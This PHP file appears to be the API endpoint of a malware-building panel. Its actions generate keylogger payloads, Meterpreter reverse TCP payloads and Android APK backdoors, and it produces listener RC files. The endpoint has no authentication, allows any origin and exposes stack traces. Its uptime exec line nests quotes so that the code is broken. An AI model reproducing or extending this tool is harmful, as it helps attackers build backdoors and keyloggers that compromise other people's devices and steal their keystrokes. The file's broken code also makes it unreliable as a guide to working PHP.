<?php
/**
 * COSMIC OSINT LAB - Module Integration API v4.0
 * Supports AdvancedPayloadModule keylogger generation.
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

session_start();

$trojan_module = null;
$advanced_module = null;

if (file_exists(__DIR__ . '/../system/modules/TrojanModule.php')) {
    require_once __DIR__ . '/../system/modules/TrojanModule.php';
    if (class_exists('EnhancedTrojanModule')) $trojan_module = new EnhancedTrojanModule();
}

if (file_exists(__DIR__ . '/../system/modules/AdvancedPayloadModule.php')) {
    require_once __DIR__ . '/../system/modules/AdvancedPayloadModule.php';
    if (class_exists('AdvancedPayloadModule')) $advanced_module = new AdvancedPayloadModule();
}

$action = $_GET['action'] ?? $_POST['action'] ?? '';
$module = $_GET['module'] ?? $_POST['module'] ?? '';

$response = ['status'=>'error','message'=>'Invalid request','timestamp'=>time(),'data'=>[]];

try {
    switch ($module) {
        case 'advanced':
            if (!$advanced_module) throw new Exception('AdvancedPayloadModule not available');
            switch ($action) {
                case 'generate':
                    $cfg = json_decode(file_get_contents('php://input'), true) ?: $_POST;
                    $payload = $advanced_module->generate_payload($cfg);
                    $response = ['status'=>'success','message'=>'Advanced payload generated','data'=>$payload];
                    break;
                case 'keylogger':
                    $cfg = json_decode(file_get_contents('php://input'), true) ?: $_POST;
                    $cfg['type'] = 'keylogger';
                    $payload = $advanced_module->generate_payload($cfg);
                    $response = ['status'=>'success','message'=>'Keylogger payload generated','data'=>$payload];
                    break;
                case 'meterpreter':
                    $cfg = json_decode(file_get_contents('php://input'), true) ?: $_POST;
                    $cfg['type'] = 'meterpreter_reverse_tcp';
                    $payload = $advanced_module->generate_payload($cfg);
                    $response = ['status'=>'success','message'=>'Meterpreter payload generated','data'=>$payload];
                    break;
                case 'android_apk':
                    $cfg = json_decode(file_get_contents('php://input'), true) ?: $_POST;
                    $cfg['type'] = 'android_backdoor_full';
                    $cfg['platform'] = 'android';
                    $cfg['format'] = 'apk';
                    $payload = $advanced_module->generate_payload($cfg);
                    $response = ['status'=>'success','message'=>'Android APK backdoor generated','data'=>$payload];
                    break;
                case 'listener_rc':
                    $lhost = $_GET['lhost'] ?? $_POST['lhost'] ?? '127.0.0.1';
                    $lport = $_GET['lport'] ?? $_POST['lport'] ?? 4444;
                    $platform = $_GET['platform'] ?? $_POST['platform'] ?? 'generic';
                    $rc = $advanced_module->generate_listener_rc('meterpreter_reverse_tcp', $lhost, $lport, $platform);
                    $response = ['status'=>'success','message'=>'Listener RC generated','data'=>['rc_content'=>$rc]];
                    break;
                default: $response['message'] = 'Unknown action';
            }
            break;

        case 'system':
            if ($action === 'status') {
                $response = [
                    'status'=>'success',
                    'message'=>'System status',
                    'data'=>[
                        'uptime' => @exec('cat /proc/uptime | awk '{print int($1/60)" minutes"}'') ?: 'Unknown',
                        'modules' => [
                            'trojan' => $trojan_module ? 'active' : 'inactive',
                            'advanced' => $advanced_module ? 'active' : 'inactive'
                        ],
                        'resources' => [
                            'memory' => round(memory_get_usage(true)/1024/1024,2).' MB',
                            'payloads' => count(glob(__DIR__.'/../data/payloads/*')),
                            'keylogger_templates' => $advanced_module ? count($advanced_module->get_payload_types()['keylogger']['format']) : 0
                        ]
                    ]
                ];
            }
            break;

        default:
            $response['message'] = 'Unknown module';
    }
} catch (Exception $e) {
    $response['message'] = $e->getMessage();
    $response['error'] = $e->getTraceAsString();
}

echo json_encode($response, JSON_PRETTY_PRINT);
